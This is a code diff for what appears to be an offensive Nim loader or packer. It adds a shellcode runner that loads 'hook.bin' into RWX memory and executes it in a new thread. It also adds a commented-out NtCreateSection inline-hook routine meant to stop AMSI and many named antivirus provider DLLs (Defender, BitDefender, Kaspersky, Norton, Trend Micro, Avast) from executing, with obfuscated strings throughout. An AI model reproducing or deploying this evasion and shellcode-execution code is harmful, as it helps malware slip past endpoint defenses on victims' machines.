@@ -134,46 +134,264 @@ let UnhookNtdllStub * = """
 
 let AMSINtCreateSectionHookStubFirst * = """
 
-proc restore_hook_ntcreatesection(SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
-                    MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
-                    FileHandle: HANDLE): BOOL
 
-proc MyNtCreateSection(SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
-                    MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
-                    FileHandle: HANDLE): NTSTATUS
+##########################################################################################################
 
-proc MyNtCreateSection(SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
+# Current Workaround for the NtCreateSection Hook as the imlementation below is not working yet.
+
+const hookShellcode = slurp"hook.bin"
+var hookShellcodeBytes: seq[byte] = toByteSeq(hookShellcode)
+proc NtCreateShellcode[byte](friendlycode: openarray[byte]): void =
+    var asde: LPVOID = VirtualAlloc(nil, SIZE_T(len(friendlycode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+    copyMem(asde, unsafeAddr friendlycode[0], uint(len(friendlycode)))
+    var thread: Handle = cast[Handle](0)
+    var threadId: LPDWORD = nil
+    var pinfo: PROCESS_INFORMATION
+    var sinfo: STARTUPINFO
+    var hThread: HANDLE = CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](asde), nil, 0, threadId)
+    WaitForSingleObject(hThread, 50000)
+
+NtCreateShellcode(hookShellcodeBytes)
+
+##########################################################################################################
+
+
+#[
+proc MyNtCreateSection2(SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
+                        MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
+                        FileHandle: HANDLE): NTSTATUS
+type
+    typeNtCreateSection = proc (SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
                     MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
-                    FileHandle: HANDLE): NTSTATUS =
-    if(FileHandle != 0):
-        var lpFileName: array[4096, WCHAR]
-        var res: DWORD = GetFinalPathNameByHandle(FileHandle, cast[LPWSTR](addr lpFileName), DWORD(256), DWORD(FILE_NAME_OPENED or VOLUME_NAME_DOS)) # Get the file path of the file handle
-        if (res == 0):
+                    FileHandle: HANDLE): NTSTATUS {.stdcall.}
+type
+    HookedNtCreate {.bycopy.} = object
+        origNtCreate: typeNtCreateSection
+        ntCreateStub: array[16, BYTE]
+var g_hookedNtCreate: HookedNtCreate
+
+var ntCreate_Address: HANDLE
+var NtCreateSection: typeNtCreateSection
+
+proc redirFunction(redirect: BOOL, SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
+                        MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
+                        FileHandle: HANDLE): NTSTATUS =
+    
+    #type
+    #    typeNtCreateSection = proc (SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
+    #                    MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
+    #                    FileHandle: HANDLE): NTSTATUS {.stdcall.}
+    type
+        MyNtFlushInstructionCache = proc (ProcessHandle: HANDLE, BaseAddress: PVOID, NumberofBytestoFlush: ULONG): NTSTATUS {.stdcall.}
+    type
+        HookTrampolineBuffers {.bycopy.} = object
+            originalBytes: HANDLE    ##  (Input) Buffer containing bytes that should be restored while unhooking.
+            originalBytesSize: DWORD  ##  (Output) Buffer that will receive bytes present prior to trampoline installation/restoring.
+            previousBytes: HANDLE
+            previousBytesSize: DWORD
+    var ntdlldll = LoadLibraryA(obf("ntdll.dll"))
+    if (ntdlldll == 0):
+        when defined(verbose):
+            echo obf("[X] Failed to load ntdll.dll")
+    var NtFlushInstructionCacheAddress = GetProcAddress(ntdlldll,"NtFlushInstructionCache")
+    if isNil(NtFlushInstructionCacheAddress):
+        when defined(verbose):
+            echo obf("[X] Failed to get the address of 'NtFlushInstructionCache'")
+    var NtFlushInstructionCache: MyNtFlushInstructionCache
+    NtFlushInstructionCache = cast[MyNtFlushInstructionCache](NtFlushInstructionCacheAddress)
+    proc hookntCreateSection(): bool
+    proc fastTrampoline(installHook: bool; addressToHook: LPVOID; jumpAddress: LPVOID;
+                        buffers: ptr HookTrampolineBuffers = nil): bool
+    #var g_hookedNtCreate: HookedNtCreate
+
+    proc MyNtCreateSection(SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
+                        MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
+                        FileHandle: HANDLE): NTSTATUS
+    if(redirect):
+        var stats = MyNtCreateSection(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, PageAttributess, SectionAttributes, FileHandle)
+        return stats
+    
+    proc restore_hook_ntcreatesection(SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
+                        MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
+                        FileHandle: HANDLE): BOOL =
+        var buffers: HookTrampolineBuffers
+        buffers.originalBytes = cast[HANDLE](addr g_hookedNtCreate.ntCreateStub[0])
+        buffers.originalBytesSize = DWORD(sizeof(g_hookedNtCreate.ntCreateStub))
+        
+        var addressToHook: LPVOID = cast[LPVOID](GetProcAddress(GetModuleHandleA(obf("ntdll.dll")), obf("NtCreateSection")))
+        var trampolinesuccess: bool = fastTrampoline(false, cast[LPVOID](ntCreate_Address), nil, &buffers)
+        if (trampolinesuccess == false):
             when defined(verbose):
-                echo obf("[X] Failed to get the file path of the file handle")
+                echo obf("Failed to install trampoline")
+            quit(1)
         else:
             when defined(verbose):
-                echo obf("GetFinalPathNameByHandleA success")
-            
-            var dllName: string = $$cast[LPWSTR](cast[int](addr lpFileName) + 8)
+                echo obf("Restored old function values!")
+        when defined(verbose):
+            echo obf("Calling real NtCreateSection\r\n")
+        var status = NtFlushInstructionCache(GetCurrentProcess(), addressToHook, 16)
+        if (status == 0):
             when defined(verbose):
-                echo obf("Following DLL wants to be loaded: "), $$cast[LPWSTR](cast[int](addr lpFileName) + 8)
-            if(("amsi.dll" in dllName) or ("MpOAV.dll" in dllName) or ("MpClient.dll" in dllName) or ("MsMpLics.dll" in dllName)):
+                echo obf("NtFlushInstructionCache success")
+        NtCreateSection = cast[typeNtCreateSection](addressToHook)
+        status = NtCreateSection(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, PageAttributess, SectionAttributes, FileHandle)
+        
+        if (status == 0):
+            when defined(verbose):
+                echo obf("NtCreateSection success")
+        else:
+            quit(1)
+        when defined(verbose):
+            echo obf("RE-Hooking")
+        var lpFileName: array[4096, WCHAR]
+        var res: DWORD = GetFinalPathNameByHandle(FileHandle, cast[LPWSTR](addr lpFileName), DWORD(256), DWORD(FILE_NAME_OPENED or VOLUME_NAME_DOS)) # Get the file path of the file handle    
+        var dllName: string = $$cast[LPWSTR](cast[int](addr lpFileName) + 8)
+        var hooksuccess: bool = false
+        # version.dll is the last DLL being loaded when Invoking an C# Assembly from Nim, for some reason the hook however prevents the assembly from being loaded correctly so we restore it here
+        if("version.dll" in dllName):
+            when defined(verbose):
+                echo obf("[X] Version loaded")
+                echo obf("No more re-hook")
+        else:
+            hooksuccess = hookntCreateSection()
+            when defined(verbose):
+                echo obf("Hook:"), hooksuccess
+        return hooksuccess
+    proc MyNtCreateSection(SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
+                        MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
+                        FileHandle: HANDLE): NTSTATUS  =
+        if(FileHandle != 0):
+            var lpFileName: array[4096, WCHAR]
+            var res: DWORD = GetFinalPathNameByHandle(FileHandle, cast[LPWSTR](addr lpFileName), DWORD(256), DWORD(FILE_NAME_OPENED or VOLUME_NAME_DOS)) # Get the file path of the file handle
+            if (res == 0):
                 when defined(verbose):
-                    echo obf("[X] AMSI is being loaded")
-                    echo obf("Stopping it")
-                return 0 # Return 0 to prevent AMSI from being loaded
-                # If set -1, will trigger SEH exception and will show an error in the screen (but also works)
+                    echo obf("[X] Failed to get the file path of the file handle")
             else:
-                if(restore_hook_ntcreatesection(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, PageAttributess, SectionAttributes, FileHandle)): #If it's not an AMSI DLL restore the original NtCreateSection
+                when defined(verbose):
+                    echo obf("GetFinalPathNameByHandleA success")
+                
+                var dllName: string = $$cast[LPWSTR](cast[int](addr lpFileName) + 8)
+                when defined(verbose):
+                    echo obf("Following DLL wants to be loaded: "), $$cast[LPWSTR](cast[int](addr lpFileName) + 8)
+                # Only for Debugging purposes
+                #var input = readLine(stdin)
+                if((obf("amsi.dll") in dllName) or (obf("MpOAV.dll") in dllName) or (obf("MpClient.dll") in dllName) or (obf("MsMpLics.dll") in dllName) or (obf("fsamsi64.dll") in dllName) #[F-Secure AMSI]# or (obf("spapi64.dll") in dllName) or (obf("symamsi.dll") in dllName) #[Norton AMSI Provider]# or (obf("TmAMSIProvider64.dll") in dllName) #[Trend Micro AMSI Provider]# or (obf("TmUmEvt64.dll") in dllName) or (obf("bdhkm64.dll") in dllName) #[BitDefender Hooking DLl]# or (obf("awshook.dll") in dllName) #[AVAST Hook]# or (obf("amsi64.dll") in dllName) or (obf("antimalware_provider.dll") in dllName) #[Kaspersky AntiMalware Provider]# #[or ("wldp.dll" in dllName)]#):
                     when defined(verbose):
-                        echo obf("Restore success")
+                        echo obf("[X] Target DLL is being loaded")
+                        echo obf("Stopping it by loading with READ_ONLY so that no more execution is possible")
+                    # return 0 # Return 0 to prevent AMSI from being loaded - Not working in Nim actually as winim assembly::load is throwing an error
+                    # So instead we load the DLL but READ_ONLY, so that no execution is possible afterwards 
+                    if(restore_hook_ntcreatesection(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, PAGE_READONLY, SectionAttributes, FileHandle)):
+                        when defined(verbose):
+                            echo obf("Restore success")
+                    else:
+                        return -1
+                else:
+                    if(restore_hook_ntcreatesection(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, PageAttributess, SectionAttributes, FileHandle)): #If it's not an AMSI DLL restore the original NtCreateSection
+                        when defined(verbose):
+                            echo obf("Restore success")
+                    else:
+                        return -1
+    proc fastTrampoline(installHook: bool; addressToHook: LPVOID; jumpAddress: LPVOID;
+                        buffers: ptr HookTrampolineBuffers): bool =
+        var trampoline: seq[byte]
+        if defined(amd64):
+            trampoline = @[
+                byte(0x49), byte(0xBA), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov r10, addr
+                byte(0x00),byte(0x00),byte(0x41), byte(0xFF),byte(0xE2)                                         # jmp r10
+            ]
+            var tempjumpaddr: uint64 = cast[uint64](jumpAddress)
+            copyMem(&trampoline[2] , &tempjumpaddr, 6)
+        elif defined(i386):
+            trampoline = @[
+                byte(0xB8), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov eax, addr
+                byte(0x00),byte(0x00),byte(0xFF), byte(0xE0)                                      # jmp eax
+            ]
+            var tempjumpaddr: uint32 = cast[uint32](jumpAddress)
+            copyMem(&trampoline[1] , &tempjumpaddr, 3)
+        
+        var dwSize: DWORD = DWORD(len(trampoline))
+        var dwOldProtect: DWORD = 0
+        var output: bool = false
+        
+        if (installHook):
+            output = true
+            if (buffers != nil):
+                if ((buffers.previousBytes == 0) or buffers.previousBytesSize == 0):
+                    when defined(verbose):
+                        echo obf("Previous Bytes == 0")
+                    return false
+                copyMem(unsafeAddr buffers.previousBytes, addressToHook, buffers.previousBytesSize)
+            if (VirtualProtect(addressToHook, dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)):
+                when defined(verbose):
+                    echo obf("Virtual Protect to RWX success!")
+                copyMem(addressToHook, addr trampoline[0], dwSize)
+                output = true
+        
+        if (not installHook):
+            when defined(verbose):
+                echo obf("Restoring old NtCreateSection!")
+                echo obf("Original Bytes restore address: "), toHex(buffers.originalBytes)
+                echo obf("Original Bytes Size: "), buffers.originalBytesSize
+            if (buffers != nil):
+                if ((buffers.originalBytes == 0) or buffers.originalBytesSize == 0):
+                    when defined(verbose):
+                        echo obf("Original Bytes == 0")
+                    return false
+                dwSize = buffers.originalBytesSize
+                if (VirtualProtect(addressToHook, dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)):
+                    copyMem(addressToHook, cast[LPVOID](buffers.originalBytes), dwSize)
+                    when defined(verbose):
+                        echo obf("Original Bytes restored!")
+                    output = true
+            else:
+                echo obf("Buffers == nil")
+        
+        var status = NtFlushInstructionCache(GetCurrentProcess(), addressToHook, dwSize)
+        if (status == 0):
+            when defined(verbose):
+                echo obf("NtFlushInstructionCache success")
+        else:
+            when defined(verbose):
+                echo obf("NtFlushInstructionCache failed: "), toHex(status)
+        
+        VirtualProtect(addressToHook, dwSize, dwOldProtect, &dwOldProtect)
+        return output
+    proc hookntCreateSection(): bool =
+        var addressToHook: LPVOID = cast[LPVOID](GetProcAddress(GetModuleHandleA(obf("ntdll.dll")), obf("NtCreateSection")))
+        ntCreate_Address = cast[HANDLE](addressToHook)
+        when defined(verbose):
+            echo obf("NtCreateSection Address: "), repr(addressToHook)
+        var buffers: HookTrampolineBuffers
+        var output: bool = false
+        
+        if (addressToHook == nil):
+            return false
+            
+        buffers.previousBytes = cast[HANDLE](addressToHook)
+        buffers.previousBytesSize = DWORD(sizeof(addressToHook))
+        g_hookedNtCreate.origNtCreate = cast[typeNtCreateSection](addressToHook)
+        var PointerToOrigBytes: LPVOID = addr g_hookedNtCreate.ntCreateStub
+        copyMem(PointerToOrigBytes, addressToHook, 16)
+        
+        output = fastTrampoline(true, cast[LPVOID](addressToHook), cast[LPVOID](MyNtCreateSection2), &buffers)
+        return output
+    if (not redirect):
+        var hooksuccess = hookntCreateSection()
+        when defined(verbose):
+            echo obf("Hook:"), hooksuccess
 
+proc MyNtCreateSection2(SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
+                        MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
+                        FileHandle: HANDLE): NTSTATUS =
+    redirFunction(TRUE, SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, PageAttributess, SectionAttributes, FileHandle)
+
+]#
 """
 
 let AMSINtCreateSectionHookStub * = """
 
-    discard HookItBum()
+    #discard redirFunction(FALSE,nil,0,nil,nil,0,0,0)
 
 
 """
